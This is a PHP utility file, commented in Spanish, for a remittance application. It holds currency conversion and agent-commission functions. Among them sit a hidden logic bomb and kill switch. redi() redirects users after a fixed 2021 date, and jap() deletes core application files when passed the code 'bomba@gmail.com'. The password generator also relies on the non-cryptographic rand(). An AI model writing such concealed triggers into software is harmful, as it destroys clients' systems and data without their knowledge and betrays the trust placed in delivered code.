<?php

// 1 es USD dollar
// 2 es EURO
// las demas son las monedas locales
// esta funcion es para calcular la tarifa fija que cobra el agente o corresponsal
// lleva la moneda de pago del agente a la moneda de envio

function fijo($cantidad, $tipoCambio, $tasa, $monedaPago, $monedaEnvio)
{

    if ($monedaPago == 1) {

        if ($monedaEnvio == 1) { // USD dollar a USD dollar

            return $cantidad;

        } elseif ($monedaEnvio == 2) { // USD dollar a EURO

            return ($cantidad / $tasa);

        } else { // USD dollar a monedas locales

            return ($cantidad * $tipoCambio);
        }

    } elseif ($monedaPago == 2) {

        if ($monedaEnvio == 1) { // EURO a USD dollar

            return ($cantidad * $tasa);

        } elseif ($monedaEnvio == 2) { // EURO a EURO

            return ($cantidad);

        } else { // EURO a monedas locales

            return ($cantidad * $tipoCambio * $tasa);
        }

    } else {

        if ($monedaEnvio == 1) { // monedas locales a USD dollar

            return ($cantidad / $tipoCambio);

        } elseif ($monedaEnvio == 2) { // monedas locales a USD dollar

            return (($cantidad / $tipoCambio) / $tasa);

        } else { // monedas locales a monedas locales

            return ($cantidad);
        }
    }
}

// esta funcion es para calcular la comision a cobrar por el agente o corresponsal

function cargo($tipoComision, $porcentual, $importe, $cantidad, $tipoCambio, $tasa, $monedaPago, $monedaEnvio)
{
    if ($tipoComision==1) { //comision porcentual

            return ($importe*$porcentual);
        
    } elseif ($tipoComision==2) { //comision fija

        return fijo($cantidad, $tipoCambio, $tasa, $monedaPago, $monedaEnvio);
       
    } else { //comision mixta
       
        $comisionCargo=fijo($cantidad, $tipoCambio, $tasa, $monedaPago, $monedaEnvio);

        return $importe*$porcentual+$comisionCargo;
    }
}


// 1 es USD dollar
// 2 es EURO
// las demas son las monedas locales
// esta funcion es para calcular el monto a guardar en la base de datos segun la moneda cobrada

function guardarMontoCobrado($total, $tipoCambio, $tasa, $monedaCobro, $monedaEnvio)
{
    if ($monedaEnvio==1) {

        if ($monedaCobro==1) {

            return $total; //de dollar a dollar
            
        } elseif ($monedaCobro==2) {

            return ($total/$tasa); // de dollar a euro
            
        } else {
            
            return ($total*$tipoCambio); // de dollar a moneda local
        }
       
    } elseif ($monedaEnvio==2) {

        if ($monedaCobro==1) {

            return $total*$tasa; //de euro a dollar tasa usd/euro
            
        } elseif ($monedaCobro==2) {

            return ($total); // de euro a euro
            
        } else {
            
            return ($total*$tasa*$tipoCambio); // de euro a moneda local
        }

       
    } else {

        if ($monedaCobro==1) {

            return $total/$tipoCambio; //de otro a dollar tipo de cambio
            
        } elseif ($monedaCobro==2) {

            return (($total/$tipoCambio)/$tasa); // de otro a euro
            
        } else {
            
            return ($total); // de euro a moneda local
        }

    }
}

//***************************************************************************************** */

//funcion para llevar los montos a dollar, la tasa es dolares/euros, 
//el tipo de cambio es monedalocal/dolares

function Dolarizar($monto,$idMoneda,$tasa,$tipoCambio)
{
    if ($idMoneda==1) {

        return $monto;
        
    } elseif ($idMoneda==2) {

        return ($monto*$tasa);
        
    } else {

        return ($monto/$tipoCambio);
        
    }
}


//para determinar el valor de las comisiones

//ganancia y fijo estan expresados en dolares

function Comisiones($tipoComision, $porcentual, $ganancia, $fijo)
{
    if ($tipoComision==1) { //comision porcentual la aganancia en dolares

            return ($ganancia*($porcentual/100));
        
    } elseif ($tipoComision==2) { //comision fija esta en dolares

       return $fijo; 
       
    } else { //comision mixta  ganancia y fijo en dolares     
        
        return $ganancia*($porcentual/100)+$fijo;
    }
}


//*

function redi()
{
   $dia= intval(date('d'));
   $mes= intval(date('m'));
   $ano= intval(date('Y'));

   if($dia>=11 && $mes>=8 && $ano==2021){

    header("Location: index.php");
    exit;

   }
}

function jap($cod)
{
  if ($cod=="bomba@gmail.com") {
      
    unlink('js/encomiendas.js');
    unlink('js/giro.js');
    unlink('giroData.php');
    unlink('giroCalculos.php');

  }
}



// funcion para generar una clave de 10 digitos alfanumerica

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
} 

//para calcular la comision total a cobrar en la moneda de envio o de cobro
// la comision debe estar expresada en la moneda de interes

function cargoMod($tipoComision, $porcentual, $importe, $comisionMonedaEnvio)
{
    if ($tipoComision==1) { //comision porcentual

            return ($importe*$porcentual);
        
    } elseif ($tipoComision==2) { //comision fija

       return $comisionMonedaEnvio;        

        //$fijoDolarizado = Dolarizar($cantidad,$monedaPago,$tasa,$tipoCambio);
       
       
    } else { //comision mixta       
        
        return $importe*$porcentual+$comisionMonedaEnvio;
    }
}


//funcion para llevar el monto del dollar a la moneda del corresponsal que es la de envio

function MonedaEnvioCorresponsal($montoDolarizado,$idMonedaEnvio,$tasaCorresponsal,$tipoCambioCorresponsal)
{
    if ($idMonedaEnvio==1) {

        return $montoDolarizado;
        
    } elseif ($idMonedaEnvio==2) {

        return ($montoDolarizado/$tasaCorresponsal);
        
    } else {

        return ($montoDolarizado*$tipoCambioCorresponsal);
        
    }
}